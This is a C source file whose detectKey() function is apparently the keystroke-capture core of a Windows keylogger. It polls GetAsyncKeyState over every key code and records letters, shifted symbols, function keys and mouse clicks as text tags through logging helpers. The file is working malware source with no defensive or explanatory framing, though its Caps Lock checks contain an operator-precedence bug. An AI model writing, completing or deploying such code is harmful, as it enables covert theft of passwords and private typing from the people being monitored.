#include"Logger.h"

void detectKey()
{
  for ( key = 0; key < 256; key++ )
  {
    if ( GetAsyncKeyState( key ) == -32767 )
    {
      if ( !( GetKeyState( 16 ) & 0x8000 ) )
      {
        if ( key > 63 && key < 91 ) AddChars(GetKeyState(0x14) & 0xFFFF!=0?key:(key + 32) );
        else if ( ( key > 47 && key < 58 ) ) AddChars( key );
        else if ( key == 8 ) AddStr( "[Backspace]" );
        else if ( key == 9 ) AddStr( "[Tab]" );
        else if ( key == 20 ) AddStr( "[Caps_Lock]" );
        else if ( key == 27 ) AddStr( "[Esc]" );
        else if ( key == 33 ) AddStr( "[Pg_Up]" );
        else if ( key == 34 ) AddStr( "[Pg_Dn]" );
        else if ( key == 35 ) AddStr( "[End]" );
        else if ( key == 36 ) AddStr( "[Home]" );
        else if ( key == 37 ) AddStr( "[LArrow]" );
        else if ( key == 38 ) AddStr( "[UArrow]" );
        else if ( key == 39 ) AddStr( "[RArrow]" );
        else if ( key == 40 ) AddStr( "[DArrow]" );
        else if ( key == 44 ) AddStr( "[PrtSc_SysRq]" );
        else if ( key == 45 ) AddStr( "[Ins]" );
        else if ( key == 46 ) AddStr( "[Del]" );
        else if ( key == 112 ) AddStr( "[F1]" );
        else if ( key == 113 ) AddStr( "[F2]" );
        else if ( key == 114 ) AddStr( "[F3]" );
        else if ( key == 115 ) AddStr( "[F4]" );
        else if ( key == 116 ) AddStr( "[F5]" );
        else if ( key == 117 ) AddStr( "[F6]" );
        else if ( key == 118 ) AddStr( "[F7]" );
        else if ( key == 119 ) AddStr( "[F8]" );
        else if ( key == 120 ) AddStr( "[F9]" );
        else if ( key == 121 ) AddStr( "[F10]" );
        else if ( key == 122 ) AddStr( "[F11]" );
        else if ( key == 123 ) AddStr( "[F12]" );
        else if ( key == 186 ) AddStr( ";" );
        else if ( key == 188 ) AddStr( "," );
        else if ( key == 190 ) AddStr( "." );
        else if ( key == 191 ) AddStr( "/" );
        else if ( key == 192 ) AddStr( "`" );
        else if ( key == 219 ) AddStr( "[" );
        else if ( key == 220 ) AddStr( "\\" );
        else if ( key == 221 ) AddStr( "]" );
        else if ( key == 222 ) AddStr( "'" );
        else if ( key == 187 ) AddStr( "=" );
        else if ( key == 189 ) AddStr( "-" );
        else if ( key == 162 ) AddStr( "[LCtrl]" );
        else if ( key == 163 ) AddStr( "[RCtrl]" );
        else if ( key == 164 ) AddStr( "[LAlt]" );
        else if ( key == 165 ) AddStr( "[RAlt]" );
        else if ( key == 91 ) AddStr( "[Windows_Key]" );
        else if ( key == 93 ) AddStr( "[Properties_Key]" );
        else if ( key == 32 ) AddStr( "[ ]" );
        else if ( key == 13 ) AddStr( "[<-|]" );
        //else if ( key == 16 ) AddStr( "[Shift]" );
      }
      else
      {
        if ( ( key > 63 && key < 91 ) ) AddChars( GetKeyState(0x14) & 0x8000!=0?(key+32):(key));
        else if ( key == 8 ) AddStr( "[Backspace]" );
        else if ( key == 9 ) AddStr( "[Tab]" );
        else if ( key == 13 ) AddStr( "[<-|]" );
        else if ( key == 20 ) AddStr( "[Caps_Lock]" );
        else if ( key == 27 ) AddStr( "[Esc]" );
        else if ( key == 32 ) AddStr( "[ ]" );
        else if ( key == 33 ) AddStr( "[Pg_Up]" );
        else if ( key == 34 ) AddStr( "[Pg_Dn]" );
        else if ( key == 35 ) AddStr( "[End]" );
        else if ( key == 36 ) AddStr( "[Home]" );
        else if ( key == 37 ) AddStr( "[LArrow]" );
        else if ( key == 38 ) AddStr( "[UArrow]" );
        else if ( key == 39 ) AddStr( "[RArrow]" );
        else if ( key == 40 ) AddStr( "[DArrow]" );
        else if ( key == 44 ) AddStr( "[PrtSc_SysRq]" );
        else if ( key == 45 ) AddStr( "[Ins]" );
        else if ( key == 46 ) AddStr( "[Del]" );
        else if ( key == 48 ) AddStr( ")" );
        else if ( key == 49 ) AddStr( "!" );
        else if ( key == 50 ) AddStr( "@" );
        else if ( key == 51 ) AddStr( "#" );
        else if ( key == 52 ) AddStr( "$" );
        else if ( key == 53 ) AddStr( "%" );
        else if ( key == 54 ) AddStr( "^" );
        else if ( key == 55 ) AddStr( "&" );
        else if ( key == 56 ) AddStr( "*" );
        else if ( key == 57 ) AddStr( "(" );
        else if ( key == 91 ) AddStr( "[Windows_Key]" );
        else if ( key == 93 ) AddStr( "[Properties_Key]" );
        else if ( key == 112 ) AddStr( "[F1]" );
        else if ( key == 113 ) AddStr( "[F2]" );
        else if ( key == 114 ) AddStr( "[F3]" );
        else if ( key == 115 ) AddStr( "[F4]" );
        else if ( key == 116 ) AddStr( "[F5]" );
        else if ( key == 117 ) AddStr( "[F6]" );
        else if ( key == 118 ) AddStr( "[F7]" );
        else if ( key == 119 ) AddStr( "[F8]" );
        else if ( key == 120 ) AddStr( "[F9]" );
        else if ( key == 121 ) AddStr( "[F10]" );
        else if ( key == 122 ) AddStr( "[F11]" );
        else if ( key == 123 ) AddStr( "[F12]" );
        else if ( key == 162 ) AddStr( "[LCtrl]" );
        else if ( key == 163 ) AddStr( "[RCtrl]" );
        else if ( key == 164 ) AddStr( "[LAlt]" );
        else if ( key == 165 ) AddStr( "[RAlt]" );
        else if ( key == 186 ) AddStr( ":" );
        else if ( key == 187 ) AddStr( "+" );
        else if ( key == 188 ) AddStr( "<" );
        else if ( key == 189 ) AddStr( "_" );
        else if ( key == 190 ) AddStr( ">" );
        else if ( key == 191 ) AddStr( "?" );
        else if ( key == 192 ) AddStr( "~" );
        else if ( key == 219 ) AddStr( "{" );
        else if ( key == 220 ) AddStr( "|" );
        else if ( key == 221 ) AddStr( "}" );
        else if ( key == 222 ) AddStr( "\"" );
        //else if ( key == 16 ) AddStr( "[Shift]" );
      }
      if(key==1) AddStr("\n[MouseL]\n");
      else if(key==2) AddStr("\n[MouseR]\n");
    }
  }
}
